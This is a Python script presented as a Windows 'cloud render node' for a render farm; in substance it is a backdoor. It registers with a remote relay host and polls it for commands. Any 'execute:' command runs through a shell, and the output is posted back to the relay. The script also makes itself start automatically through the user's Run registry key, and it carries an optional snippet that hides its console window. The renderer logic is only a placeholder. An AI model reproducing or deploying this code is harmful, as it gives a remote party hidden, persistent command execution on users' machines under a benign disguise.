import subprocess
import sys
import os
import time
import threading
import socket
import json
import winreg
from pathlib import Path
import platform
import uuid
import requests
from datetime import datetime

class CloudRenderNode:
    def __init__(self):
        # Cloud relay configuration - UPDATED to HTTP
        self.relay_config = {
            'relay_url': 'https://mathematical-judy-bageltigerstudeos-3479b0db.koyeb.app',
            'heartbeat_interval': 30,
            'reconnect_delay': 5
        }
        
        self.config = {
            'render_app': r'C:\Path\To\Your\Renderer.exe',
            'work_dir': r'C:\render_farm\work',
            'max_restarts': 9999,
            'restart_delay': 5
        }
        
        # Setup directories
        Path(self.config['work_dir']).mkdir(parents=True, exist_ok=True)
        
        # State management
        self.restart_count = 0
        self.is_running = True
        self.current_process = None
        self.node_id = None
        
        # Get node identity
        self.node_info = self.get_node_identity()
        
        # Setup auto-start
        self.setup_autostart()
        
        print(f"☁️  Cloud Render Node '{self.node_info['node_name']}' starting...")
        print(f"   Relay: {self.relay_config['relay_url']}")
        
    def get_node_identity(self):
        """Get or create this node's identity"""
        identity_file = Path('node_identity.json')
        if identity_file.exists():
            try:
                with open(identity_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        computer_name = platform.node()
        identity = {
            'node_name': f"Node-{computer_name}-{str(uuid.uuid4())[:8]}",
            'computer_name': computer_name,
            'system_type': 'render_node',
            'version': '1.0',
            'system_info': {
                'os': platform.system(),
                'processor': platform.processor(),
                'architecture': platform.architecture()[0]
            }
        }
        
        try:
            with open(identity_file, 'w') as f:
                json.dump(identity, f, indent=2)
        except:
            pass
            
        return identity

    def register_with_relay(self):
        """Register this node with the cloud relay"""
        try:
            response = requests.post(
                f"{self.relay_config['relay_url']}/node/register",
                json={
                    'node_name': self.node_info['node_name'],
                    'computer_name': self.node_info['computer_name']
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.node_id = data.get('node_id')
                print(f"✅ Registered with cloud relay! Node ID: {self.node_id}")
                return True
            else:
                print(f"❌ Registration failed: {response.text}")
                return False
                
        except Exception as e:
            print(f"❌ Registration error: {e}")
            return False

    def send_heartbeat(self):
        """Send heartbeat to relay and get pending commands"""
        if not self.node_id:
            return []
            
        try:
            response = requests.post(
                f"{self.relay_config['relay_url']}/node/heartbeat",
                json={
                    'node_id': self.node_id
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                if commands:
                    print(f"📨 Received {len(commands)} commands")
                return commands
            else:
                print(f"❌ Heartbeat failed: {response.text}")
                return []
                
        except Exception as e:
            print(f"❌ Heartbeat error: {e}")
            return []

    def send_command_response(self, command_id, response_data):
        """Send command response back to relay"""
        try:
            requests.post(
                f"{self.relay_config['relay_url']}/command/response",
                json={
                    'command_id': command_id,
                    'response': response_data
                },
                timeout=10
            )
        except Exception as e:
            print(f"❌ Failed to send response: {e}")

    def handle_command(self, command):
        """Execute commands and return output"""
        try:
            if command == 'status':
                return {
                    'status': 'running', 
                    'restarts': self.restart_count,
                    'renderer_running': self.current_process and self.current_process.poll() is None,
                    'node_name': self.node_info['node_name'],
                    'computer_name': self.node_info['computer_name'],
                    'timestamp': datetime.now().isoformat()
                }
            
            elif command == 'stop':
                self.is_running = False
                if self.current_process:
                    self.current_process.terminate()
                return {'status': 'shutting_down'}
            
            elif command.startswith('execute:'):
                cmd = command[8:]
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                return {
                    'returncode': result.returncode,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'command': cmd
                }
            
            elif command == 'restart_renderer':
                if self.current_process:
                    self.current_process.terminate()
                return {'status': 'renderer_restarting'}
            
            else:
                return {'error': f'Unknown command: {command}'}
                
        except Exception as e:
            return {'error': str(e)}

    def process_commands(self, commands):
        """Process all pending commands"""
        for command_data in commands:
            command_id = command_data.get('command_id')
            command = command_data.get('command')
            
            print(f"🔄 Executing command: {command}")
            
            # Execute command
            response = self.handle_command(command)
            
            # Send response back
            self.send_command_response(command_id, response)
            
            # Handle stop command immediately
            if command == 'stop':
                return False
                
        return True

    def run_renderer(self):
        """Run the renderer application"""
        try:
            if os.path.exists(self.config['render_app']):
                self.current_process = subprocess.Popen(
                    [self.config['render_app']],
                    cwd=self.config['work_dir'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                return self.current_process.wait()
            else:
                print(f"⚠️  Render app not found: {self.config['render_app']}")
                # Simulate renderer for demo
                time.sleep(10)
                return 0
        except Exception as e:
            print(f"Renderer error: {e}")
            return 1

    def start_heartbeat_loop(self):
        """Start the heartbeat and command processing loop"""
        print("🫀 Starting heartbeat loop...")
        
        # Register first
        if not self.register_with_relay():
            print("❌ Failed to register with relay, retrying in background...")
        
        while self.is_running:
            try:
                # Send heartbeat and get commands
                commands = self.send_heartbeat()
                
                # Process any commands
                if commands:
                    should_continue = self.process_commands(commands)
                    if not should_continue:
                        break
                
            except Exception as e:
                print(f"❌ Heartbeat loop error: {e}")
            
            # Wait before next heartbeat
            time.sleep(self.relay_config['heartbeat_interval'])
        
        print("Heartbeat loop stopped")

    def start(self):
        """Main execution loop"""
        print("🚀 Starting cloud render node...")
        
        # Start heartbeat loop in separate thread
        heartbeat_thread = threading.Thread(target=self.start_heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Main render loop
        while self.is_running and self.restart_count < self.config['max_restarts']:
            self.restart_count += 1
            print(f"🎬 Render restart #{self.restart_count}")
            
            exit_code = self.run_renderer()
            
            if not self.is_running:
                break
                
            print(f"Renderer exited with code {exit_code}, restarting in {self.config['restart_delay']}s...")
            time.sleep(self.config['restart_delay'])
        
        print("🛑 Cloud render node shutting down")
        self.is_running = False

    def setup_autostart(self):
        """Register for auto-start without admin rights"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "CloudRenderNode", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
            print("✅ Auto-start configured successfully")
        except Exception as e:
            print(f"⚠️  Auto-start configuration failed: {e}")

if __name__ == "__main__":
    # Optional: Hide console window (uncomment if needed)
    """
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    """
    
    node = CloudRenderNode()
    node.start()